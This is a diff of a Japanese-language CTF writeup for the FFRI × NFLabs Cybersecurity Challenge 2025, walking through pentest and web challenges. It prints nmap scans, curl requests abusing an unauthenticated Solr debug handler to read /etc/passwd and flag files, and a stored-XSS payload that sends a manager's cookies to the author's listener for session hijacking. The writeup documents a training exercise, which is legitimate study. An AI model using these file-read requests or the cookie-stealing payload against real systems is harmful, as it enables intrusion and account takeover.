@@ -1,24 +1,32 @@
 ---
 title: "FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup & Upsolve"
-date: "2025/09/15"
+date: 2025-09-15
+description: "参加記と一部アップソルブ。SolrのLFI経由でflag取得まで。"
 ---
 
 # FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup
 
-FFRI × NFLabs. Cybersecurity Challenge 2025に参加しており、13位でした。<br>
-Top10にはせめて入りたいなと思いながらやっていました。悔しいです。
+FFRI × NFLabs. Cybersecurity Challenge 2025 に参加し、結果は **13位** でした。Top10入りを目標にしていたので悔しい……。
+
 ![ranking](/src/content/image/FFRI_NFLabs_ranking.png)
 
 ## Welcome [ 1/1 ]
+
 ### Welcome [175pt / 66 solves]
-提出のみ
+提出のみ。
+
 ```
 flag{Good_Luck_and_Have_Fun!}
 ```
 
+---
+
 ## Pentest [ 3/7 ]
-### HiddenService[255pt / 50 solves]
-nmapを実行すると、22番ポートでsshと31337番ポートでApacheのサービスが動いていることが分かる。
+
+### HiddenService [255pt / 50 solves]
+
+`nmap` で 22/tcp (ssh)、31337/tcp (Apache) を確認。
+
 ```bash
 $ nmap 10.0.129.138 -sV
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:51 JST
@@ -33,14 +41,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.53 seconds
 ```
-31337番ポートにアクセスすると、Shellにアクセスできる。<br>
-catやlsが実行できるため、flag.txtがあるディレクトリを探索するとflagをGET。
+
+31337 番にアクセスすると簡易シェルに入れたため、`ls`/`cat` で探索して `flag.txt` を取得。
+
 ![Hidden_result](/src/content/image/Hidden_result.png)
+
 ```
 flag{Ch4nging_th3_p0rt_is_p0intl3ss}
 ```
+
+---
+
 ### Shell4Solr [455pt / 16 solves]
-nmapを実行すると、80番ポートでApatch Solr、2222番ポートでsshが動いていることが分かる。
+
+`nmap` で 80/tcp (Apache Solr)、2222/tcp (ssh) を確認。80 番は **Apache Solr 8.11.0** の管理画面。
+
 ```bash
 $ nmap 10.0.129.148 -sV
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 17:19 JST
@@ -55,49 +70,35 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
 ```
-80番ポートにアクセスすると、Apatch Solrの管理画面が表示される。バージョンは8.11.0。問題文のヒントより、log4jの脆弱性がこのサイトには含まれているらしいので、この[Github](https://github.com/LucasPDiniz/CVE-2021-44228)を参考にlog4jのpocを検証した。payloadを送信するとnetcatで結果が返されることが分かったので、log4jの脆弱性を使うのは確定なのだろう
-![alt text](image.png)
-この[poc](https://github.com/mbechler/marshalsec)を検証しようとしたがJDK17でビルドしようとしていたため、java.base/java.langなどが開かず、うまく動かない。Dockerなどを用意して何とかビルドしようとしていたが、うまくいかず断念<br>
-調査する上で、Logging画面(/~logging)にauthentication=disabled authorization=disabledと出ているのを発見。GPTを使いながら調べているとSolrには開発・デバッグ用途の DumpRequestHandler があり、ContentStreams（stream.*）をそのまま返す挙動があるらしく、管理系が認証なしで空いているのでデバッグ系も空いている可能性が高いと判断した。そのため`GET /solr/<core>/debug/dump?param=ContentStreams`というリクエストを送ると、レスポンスが返ってくるのかを確認。加えて`param=`という引数を与えているので、ここでLFIができるのかも一緒に検証
+
+ログ画面（`/admin/info/logging`）に **`authentication=disabled, authorization=disabled`** と表示。
+![warn](/src/content/image/Solr_warn.png)
+Solr にはデバッグ用途の **DumpRequestHandler** があり、`ContentStreams (stream.*)` をそのまま返すため、認証なしで開いていれば **LFI** が狙えると判断。
+まずは `/etc/passwd` を読めるか検証：
+
 ```bash
-$ curl -s "http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
+curl -s "http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd"
 ```
-```JSON
+
+<details>
+<summary><b>レスポンス（抜粋・JSON）</b></summary>
+
+```json
 {
-  "responseHeader": {
-    "status": 0,
-    "QTime": 7,
-    "handler": "org.apache.solr.handler.DumpRequestHandler",
-    "params": {
-      "param": "ContentStreams",
-      "stream.url": "file:///etc/passwd"
-    }
-  },
-  "params": {
-    "stream.url": "file:///etc/passwd",
-    "echoHandler": "true",
-    "param": "ContentStreams",
-    "echoParams": "explicit"
-  },
+  "responseHeader": { "status": 0, "handler": "org.apache.solr.handler.DumpRequestHandler" },
+  "params": { "stream.url": "file:///etc/passwd", "param": "ContentStreams" },
   "streams": [
     {
-      "name": null,
       "sourceInfo": "url",
-      "size": null,
-      "contentType": null,
-      "stream": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nsolr:x:1000:1000:Linux User,,,:/opt/solr:/bin/ash\n"
+      "stream": "root:x:0:0:root:/root:/bin/ash\n...snip...\nsolr:x:1000:1000:Linux User,,,:/opt/solr:/bin/ash\n"
     }
-  ],
-  "context": {
-    "webapp": "/solr",
-    "path": "/debug/dump",
-    "httpMethod": "GET"
-  }
+  ]
 }
-
 ```
-すると`file:///etc/passwd`の中身が返ってきて、LFI成功<br>
-環境変数に`HOME=/opt/solr`, `PWD=/opt/solr/server`とあるため、ここから連想されるflag.txtがあるディレクトリに対してリクエストを送るとflagをゲットできた。(ログが長いので省略)
+</details>
+
+`HOME=/opt/solr`, `PWD=/opt/solr/server` などから flag の置き場所を当たり、いくつかの典型パスを総当たり。
+
 ```bash
 CORE=${CORE:-core0}
 BASE="http://10.0.129.128:80/solr/$CORE/debug/dump?param=ContentStreams&stream.url=file://"
@@ -118,59 +119,108 @@ do
   echo
 done
 ```
-```JSON
-{
-  "responseHeader": {
-    "status": 0,
-    "QTime": 1,
-    "handler": "org.apache.solr.handler.DumpRequestHandler",
-    "params": {
-      "param": "ContentStreams",
-      "stream.url": "file:///opt/solr/server/flag.txt"
-    }
-  },
-  "params": {
-    "stream.url": "file:///opt/solr/server/flag.txt",
-    "echoHandler": "true",
-    "param": "ContentStreams",
-    "echoParams": "explicit"
-  },
-  "streams": [
-    {
-      "name": null,
-      "sourceInfo": "url",
-      "size": null,
-      "contentType": null,
-      "stream": "flag{l0g4j_s0lr_r3vshell}"
-    }
-  ],
-  "context": {
-    "webapp": "/solr",
-    "path": "/debug/dump",
-    "httpMethod": "GET"
-  }
-}
 
+`/opt/solr/server/flag.txt` でヒット：
+
+<details>
+<summary><b>レスポンス（JSON）</b></summary>
+
+```json
+{
+  "responseHeader": { "status": 0 },
+  "params": { "stream.url": "file:///opt/solr/server/flag.txt" },
+  "streams": [
+    { "sourceInfo": "url", "stream": "flag{l0g4j_s0lr_r3vshell}" }
+  ],
+  "context": { "path": "/debug/dump", "httpMethod": "GET" }
+}
 ```
+</details>
+
 ```
 flag{l0g4j_s0lr_r3vshell}
 ```
-log4jのpocが使えないことが分かってから1時間くらい格闘してました。
+
+> 余談：当初は Log4Shell の RCE PoC を試したがJDK17でビルドがうまくいかず、GPTに聞きながら1時間くらい格闘してました
+
+---
 
 ## Web [ 3/4 ]
-### Secure Web Company
+### Secure Web Company [300pt / 41 solves]
+Dockerfileを見るとREADME.mdが公開されていた。
+```Dockerfile
+FROM nginx:alpine
+COPY index.html script.js style.css README.md /usr/share/nginx/html/
+```
+```bash
+$ curl http://10.0.129.147:8090/README.md 
+# 開発者向け
+
+## 管理画面認証情報
+
+- ユーザー名: admin
+- パスワード: flag{5up3r53cr37_4dm1n_p455w0rd}
+```
+```
+flag{5up3r53cr37_4dm1n_p455w0rd}
+```
+
+### Timecard [380pt / 25 solves]
+問題文を読んで、managerのアカウントが1分に1回申請を承認するようになっていたのでStored XSSを使う問題なのかとなぁと思いながら問題を解き始めた。案の定app.pyを見ると、`HttpOnly=false`となっていた。
+加えてmanager側の`manager_dashboard.html.js`で`{{ remarks }}`をそのままhtmlとして解釈できるようになっていた。
+```PY
+app.config['SESSION_COOKIE_HTTPONLY'] = False
+app.config['SECRET_KEY'] = SECRET_KEY
+app.config['SQLALCHEMY_DATABASE_URI'] = f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
+```
+```html
+    <ul>
+        {% for timecard in timecards %}
+            <li>
+                {{ timecard.date }}: {{ timecard.start_time }} - {{ timecard.end_time }} ({{ timecard.remarks }})
+                <!-- 状態表示 -->
+                {% if timecard.cancel_requested %}
+                    - <span style="color:orange;">取り消し申請中</span>
+                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
+                        <button type="submit">取り消し申請承認</button>
+                    </form>
+                {% elif timecard.approved %}
+                    - <span style="color:green;">承認済み</span>
+                {% else %}
+                    - <span style="color:red;">未承認</span>
+                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
+                        <button type="submit">承認</button>
+                    </form>
+                {% endif %}
+            </li>
+        {% endfor %}
+    </ul>
+```
+これを使ってStored XSSを行う。managerが1分に1回承認しに来るので、そこに`document.cookie`を仕込むことでmanagerのsessionを奪う。まずは待ち受けを立てる
+```PY
+python3 -m http.server 8000
+```
+後はremarksの部分にStored XSSを仕込む
+```
+<img src=x onerror="new Image().src='http://10.0.0.49:8000/?c='+encodeURIComponent(document.cookie)">
+```
+するとmanagerからのcookieがStored XSSによって窃取できたので、それを自身のcookieにセットする。それでflagが得られた。
+```
+flag{H9aDSMkTCWZMEuk25nZw}
+```
 
 ## Malware Analysis [ 2/4 ]
 ### Downloader
+（省略）
 
 ## Binary [ 2/4 ]
 ### Abnormal
+（省略）
 
 ## Misc [ 3/4 ]
 ### Bellaso
 
-```
-// コードブロック例
+```js
 const hello = () => {
   console.log("Hello, World!");
 };
